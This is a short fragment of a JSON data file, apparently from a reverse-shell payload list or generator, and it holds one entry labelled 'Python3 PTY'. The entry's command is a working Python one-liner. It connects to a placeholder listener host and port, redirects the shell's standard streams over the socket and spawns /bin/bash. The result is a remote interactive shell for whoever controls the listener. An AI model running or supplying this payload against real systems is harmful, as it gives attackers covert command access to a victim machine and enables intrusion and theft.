        },
        {
          "label": "Python3 PTY",
          "command": "python3 -c 'import socket,pty,os;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn(\"/bin/bash\")'"
        },
